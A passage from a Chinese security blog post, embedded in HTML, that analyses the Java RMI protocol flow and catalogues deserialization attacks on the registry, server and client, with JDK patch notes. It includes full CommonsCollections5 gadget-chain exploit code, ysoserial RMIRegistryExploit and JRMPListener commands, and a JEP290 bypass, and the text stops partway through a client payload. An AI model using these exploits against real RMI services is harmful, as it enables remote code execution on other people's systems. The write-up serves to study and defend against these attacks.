@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="RMI是一个基于序列化的Java远程方法调用机制。作为一个常见的反序列化入口，它和反序列化漏洞有着千丝万缕的联系。与RMI相关的攻击方式主要是:  直接攻击RMI JNDI注入  这篇文章主要总结RMI自身的安全问题，分析注册中心、客户端与服务端之间的交互通信流程并总结攻击RMI注册中心，RMI服务端以及RMI客户端的方式。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java RMI攻击方式分析总结">
+<meta property="og:url" content="http://yoursite.com/2020/05/29/rmi-security/index.html">
+<meta property="og:site_name" content="Ananaskr&#39;s Blog">
+<meta property="og:description" content="RMI是一个基于序列化的Java远程方法调用机制。作为一个常见的反序列化入口，它和反序列化漏洞有着千丝万缕的联系。与RMI相关的攻击方式主要是:  直接攻击RMI JNDI注入  这篇文章主要总结RMI自身的安全问题，分析注册中心、客户端与服务端之间的交互通信流程并总结攻击RMI注册中心，RMI服务端以及RMI客户端的方式。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/12.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/13.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/14.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/17.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/15.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/16.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/18.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/31.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/32.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/30.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/1-1.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/19.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/20.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/33.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/21.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/22.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/23.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/24.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/25.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/26.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/2-2.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/27.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/28.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/29.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/5-5.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/3-3.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/29/rmi-security/4-4.png">
+<meta property="article:published_time" content="2020-05-29T09:45:19.000Z">
+<meta property="article:modified_time" content="2020-05-29T09:50:33.663Z">
+<meta property="article:author" content="ananaskr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/05/29/rmi-security/9.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/05/29/rmi-security/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Java RMI攻击方式分析总结 | Ananaskr's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ananaskr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/About/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/29/rmi-security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ananaskr">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ananaskr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java RMI攻击方式分析总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-05-29 17:45:19 / Modified: 17:50:33" itemprop="dateCreated datePublished" datetime="2020-05-29T17:45:19+08:00">2020-05-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>RMI是一个基于序列化的Java远程方法调用机制。作为一个常见的反序列化入口，它和反序列化漏洞有着千丝万缕的联系。与RMI相关的攻击方式主要是:</p>
+<ul>
+<li>直接攻击RMI</li>
+<li>JNDI注入</li>
+</ul>
+<p>这篇文章主要总结RMI自身的安全问题，分析注册中心、客户端与服务端之间的交互通信流程并总结攻击RMI注册中心，RMI服务端以及RMI客户端的方式。</p>
+<a id="more"></a>
+<h1 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h1><p>RMI依赖的通信协议为JRMP，该协议为Java定制，要求服务端与客户端均为Java编写。反序列化漏洞主要与JRMP有关，在通信过程中时通过序列化方式进行编码传输的。无论在JRMP的客户端还是服务端，当接收到JRMP协议数据时，都会将序列化的数据进行反序列化，因此造成了RMI注册中心、RMI服务端、RMI客户端都易受攻击的局面。</p>
+<p>RMI分为三个主体部分:</p>
+<ul>
+<li>Client-客户端</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">HelloInterface hello &#x3D; (HelloInterface) registry.lookup(&quot;hello1&quot;);</span><br><span class="line">System.out.println(hello.sayHello(&quot;flag&quot;));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Server-服务端</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HelloImpl remote  &#x3D; new HelloImpl();</span><br><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(1099);</span><br><span class="line">registry.bind(&quot;hello1&quot;, remote);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Registry-注册中心</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(1099);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>一般注册中心和服务端都是在一块，因为注册中心仅允许来自本地的bind/rebind/unbind请求。在这里我们把它们作为独立的个体描述。</p>
+</blockquote>
+<h2 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h2><p>任何可以被远程调用的方法的对象就是远程对象，它一般在服务端。用于提供客户端进行方法调用。它必须实现<code>java.rmi.Remote</code>接口，且需要继承UnicastRemoteObject类。(<font color=#824032>继承UnicastRemoteObject类是为了方便自动调用其exportObject()方法来生成本地Stub的代理对象，然后调用LiveRef.exportObject()方法来启动socket服务</font>)。  </p>
+<p>注册中心也是一个远程对象，默认监听在1099端口上，与普通远程不一样的是，它需要自己指定端口。</p>
+<h1 id="1-注册中心与服务端"><a href="#1-注册中心与服务端" class="headerlink" title="1.注册中心与服务端"></a>1.注册中心与服务端</h1><p>服务端与注册中心之间的交互主要是服务端向注册中心绑定服务，即bind/rebind操作。关注bind代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(1099);</span><br><span class="line">registry.bind(&quot;hello&quot;,obj);</span><br></pre></td></tr></table></figure>
+
+<p><font color=#4682B4>[服务端]</font>首先getRegistry(1099)获取到了注册中心存根RegistryImpl_Stub(即注册中心RegistryImpl的代理)，然后调用其bind函数。定位到此函数.</p>
+<p><img src="9.png" alt=""></p>
+<p>先newCall建立连接，然后将object序列化发送至注册中心。注意这里的opnum参数，它代表了当前的操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 : bind</span><br><span class="line">1 : list</span><br><span class="line">2 : lookup</span><br><span class="line">3 : rebind</span><br><span class="line">4 : unbind</span><br></pre></td></tr></table></figure>
+
+<p><font color=#43CD80>[注册中心]</font>此时注册中心，接收数据的为<code>RegistryImpl_Skel#dispatch</code>。需要明白的是，RMI就是通过Stub和Skeleton在客户端和服务端传输数据。这里的var3即前面发送的opnum参数为0，即bind操作，这里直接定位到case 0:的部分。case 0中的0代表的是bind操作。</p>
+<p><img src="12.png" alt=""></p>
+<p>在这里完成了反序列化操作后，进入<code>sun.rmi.registry.RegistryImpl#bind</code>函数。</p>
+<p><img src="13.png" alt=""></p>
+<p>在这里可以看到，它在put函数之前，做了对于是否是本地的绑定的判断<code>checkAccess(&quot;Registry.bind&quot;)</code>。仅允许来自本地的bind操作。同理，可以看到，rebind/unbind操作都只能在本地完成。</p>
+<p>在完成这个bind操作之后，就进入getResultStream()函数，跟进它。</p>
+<p><img src="14.png" alt=""></p>
+<p>它会向当前连接中发送81这个传输返回码，然后发送1这个值以及ID。到这里注册中心的部分完成了，继续往回看服务端的处理。关于81以及1这个数字的含义如下。发送81代表是返回，而紧随的数字1，表示是正常返回。</p>
+<p><img src="17.png" alt=""></p>
+<p><font color=#4682B4>[服务端]</font>服务端在发送完bind的数据后，接着执行super.ref.invoke()方法，其实也就是UnicastRef.invoke()方法，在这里面继续执行var1.executeCall()函数。跟进该函数。</p>
+<p><img src="10.png" alt=""></p>
+<p>在该函数中确实接收到了注册中心的返回值，首先反序列化出var4传输返回码，该值必须为81.前面也确实传了81这个值。紧接着反序列化出var1。该值为1。因此进入case 1:的分支，直接返回了。但从代码中可以看到，若var1的值为2，则会进行反序列化。到这里整个流程分析结束了。</p>
+<p><img src="15.png" alt=""></p>
+<p>可以看到在上述的过程中，服务端和注册中心都有能够反序列化的点。</p>
+<h2 id="1-1-服务端攻击注册中心–bind-JDK-lt-8u121"><a href="#1-1-服务端攻击注册中心–bind-JDK-lt-8u121" class="headerlink" title="1.1 服务端攻击注册中心–bind (JDK&lt;8u121)"></a>1.1 服务端攻击注册中心–bind (JDK&lt;8u121)</h2><p>服务端在进行bind时，将name和object发送至注册中心，注册中心在这里进行了直接的反序列化。前面提到过，为了安全起见，仅接收本地的bind请求，只是这个判断checkAcess(“Registry.bind”)发生在反序列化之后。因此造成了，虽然bind失败，但反序列化已经发生了。</p>
+<p>因此，向注册中心bind/rebind一个精心构造的remote对象，即可造成RCE。这里可以选择CommonsCollections系列的gadget进行利用。前提是注册中心也存在对应的gadget。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>这是一个绑定了恶意的远程对象的服务端代码，利用了CommonsCollections5。构造了一个BadAttributeValueException对象，由于传过去的对象需要实现Remote接口，选择了动态代理的方法来满足这一条件。在这里的动态代理类选择了AnnotationInvocationHandler。反序列化的触发点为handler的memberValues属性即tmpMap被反序列化时执行了利用链，从而RCE了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app"&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(ouputMap, <span class="string">"pwn"</span>);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Map tmpMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            tmpMap.put(<span class="string">"pwn"</span>, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = <span class="keyword">null</span>;</span><br><span class="line">            ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">            ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">tmpMap</span>)</span>;</span><br><span class="line">            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">"hello1"</span>, remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在执行这段代码后，注册中心就弹出了计算器(环境为JDK8u111)。这段代码同时也是ysoserial工具的RMIRegistryExploit代码。该工具的利用方式为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit ip port CommonsCollections7 &quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><ul>
+<li>在JDK8u141之后，将判断是否为本地绑定请求挪到了执行反序列化之前，如下所示:</li>
+</ul>
+<p><img src="16.png" alt=""></p>
+<ul>
+<li>JDK8u121修复版本后，出现了JEP290。它在注册中心端内置了白名单，仅允许特定的类被反序列化。而上述代码使用的AnnotationInvocationHandler类不在白名单中，不允许反序列化。(后面介绍了绕过方式)</li>
+</ul>
+<h2 id="1-2-注册中心攻击服务端"><a href="#1-2-注册中心攻击服务端" class="headerlink" title="1.2 注册中心攻击服务端"></a>1.2 注册中心攻击服务端</h2><p>服务端在接收注册中心返回值时，若返回的是TransportConstants.ExceptionReturn，即值为2，就会进入case 2的分支，进行反序列化。因此注册中心攻击服务端的方式，就是伪造一个恶意的注册中心，向服务端返回TransportConstants.Return、TransportConstants.ExceptionalReturn、UID以及恶意的object。  </p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>ysoserial工具实现了这么一个恶意的注册中心，<code>ysoserial.exploit.JRMPListener</code>。截取部分关键代码，如下所示:</p>
+<p><img src="18.png" alt=""></p>
+<p>可以看到它发送了81，2，ID以及恶意的obj。复现的方式很简单，首先用ysoserial启动一个注册中心。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;open &#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后启动服务端代码，进行bind操作，就会发现在服务端弹出了计算器。</p>
+<h2 id="1-3-绕过JEP290-JDK-lt-8u232-b09"><a href="#1-3-绕过JEP290-JDK-lt-8u232-b09" class="headerlink" title="1.3 绕过JEP290 (JDK&lt;8u232_b09)"></a>1.3 绕过JEP290 (JDK&lt;8u232_b09)</h2><p>前面攻击注册中心时，在JDK8u121后，就出现了JEP290限制。要绕过这个限制，需要在白名单中找到可以利用的对象。这里关注<code>UnicastRef</code>对象。  在RMI过程中客户端与注册中心、服务端与注册中心之间建立连接都用到了UnicastRef类。用UnicastRef对象新建一个RMI连接可以绕过JEP290的限制。</p>
+<p>整个思路就是:封装一个UnicastRef对象，其中包括恶意注册中心的ip和port。使得其在原注册中心被反序列化时，反向连接一个恶意注册中心，此时原注册中心相当于客户端，由1.2攻击可知，恶意注册中心向客户端发送恶意的payload，这一过程是不受JEP290影响的。</p>
+<p>来看一下客户端连接上注册中心的具体实现，定位到<code>java.rmi.registry#getRegistry</code>。<br><img src="31.png" alt=""></p>
+<p>它通过TCPEndpoint注册注册中心的host、port等信息。然后用UnicastRef封装了LiveRef类。最后进入Util.createProxy()方法。跟进此方法。</p>
+<p><img src="32.png" alt=""></p>
+<p>在该函数中，使用动态代理处理类RemoteObjectInvocationHandler作为UnicastRef动态处理类。到这里整个连接过程结束了。事实上只需要封装一个包含恶意注册中心的host、port的UnicastRef类，然后使用RemoteObjectInvocationHandler动态代理它。</p>
+<p>ysoserial工具中实现了向原注册中心(受害者)发送UnicastRef对象的JRMPClient。<code>ysoserial.payloads.JRMPClient</code>。来看一下它的关键代码。</p>
+<p><img src="30.png" alt=""></p>
+<p>可以看到与上述的过程一样。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先启动一个恶意的注册中心，可以利用JRMPListener实现。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1098 CommonsCollections6 &quot;open &#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后启动一个客户端，还是利用的是1.1攻击中ysoserial中的RMIRegistryExploit，其中payload选择ysoserial.payloads.JRMPClient而不是CommonsCollections。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 JRMPClient &quot;127.0.0.1:1098&quot;</span><br></pre></td></tr></table></figure>
+
+<p>此时在注册中心弹出了计算器。注册中心在接收到UnicastRef对象后进行反序列化最终由DGCClient向恶意注册中心发起连接，即在反向连接的过程是DGC通信方式。有兴趣的可以自己跟一下过程。</p>
+<h3 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h3><p>在JDK8u232_b09版本中，修复了这种反向发起JRMP连接的利用。修复点包括:</p>
+<ol>
+<li>在<code>sun.rmi.registry.RegistryImpl_Skel#dispath</code>中在反序列化时，若反序列化失败/类型转换失败，就会进入discardPendingRefs()。它会清除掉目前的RMI连接。</li>
+</ol>
+<p><img src="1-1.png" alt=""></p>
+<ol start="2">
+<li>第一个补丁，其实在清除之前已经执行了反序列化。但是在复现过程中还是失败了，因为在DGC通信中，对发送/接收的数据都进行了过滤。详情可见后面<code>4.1#补丁</code>。</li>
+</ol>
+<h1 id="2-注册中心与客户端"><a href="#2-注册中心与客户端" class="headerlink" title="2.注册中心与客户端"></a>2.注册中心与客户端</h1><p>客户端与注册中心的交互主要是客户端通过list()、lookup()函数向注册中心发出请求。与服务端一样，客户端首先通过LocateRegistry.getRegistry()获的RegistryImpl_Stub对象，跟进lookup()函数。</p>
+<p><img src="19.png" alt=""></p>
+<p><font color=#EE7942>[客户端]</font>与服务端一样，先建立连接，注意这里的opnum为2，代表的是lookup操作。它首先将查询的参数值String类型的变量发送出去。</p>
+<p><font color=#43CD80>[注册中心]</font>注册中心这边同样是dispatch()函数处理。当case为2时，处理方式如下所示:</p>
+<p><img src="20.png" alt=""></p>
+<p>先反序列化传入的参数，然后进行lookup()操作，lookup()操作就是简单地根据name参数值查询绑定的Remote对象。完成这一部分后，与上面一样，注册中心向客户端返回值。然后还有一个把查询到的Remote对象进行序列化传输。</p>
+<p><font color=#EE7942>[客户端]</font>客户端接收到注册中心的返回值后，进行的invoke函数与前面服务端一样。若接收到了ransportConstants.ExceptionalReturn就会进行反序列化。与服务端bind操作不同的是，在完成这一系列后，它还会从当前的输入流中反序列化出Remote对象。至此整个过程结束。</p>
+<h2 id="2-1-客户端攻击注册中心-JDK-lt-8u121"><a href="#2-1-客户端攻击注册中心-JDK-lt-8u121" class="headerlink" title="2.1 客户端攻击注册中心(JDK&lt;8u121)"></a>2.1 客户端攻击注册中心(JDK&lt;8u121)</h2><p>这一点与服务端类似，即注册中心接收到客户端传过来的数据后，会进行反序列化。因此，若客户端lookup的参数值为一个object类型，就可以使得注册中心反序列化执行任意命令。因此，需要修改lookup函数，使之支持object类型参数。</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>在构造lookup函数请求时，只需要重新实现lookup函数的实现。这里介绍wh1t3p1g师傅写的一个<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/exploit/rmi/component/Naming.java" target="_blank" rel="noopener">改造版lookup函数</a>。将Naming.lookup和RegistryImpl_Stub.lookup合并在一起了。</p>
+<p><img src="33.png" alt=""></p>
+<p>利用CommonsCollections5，构造如下payload。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new 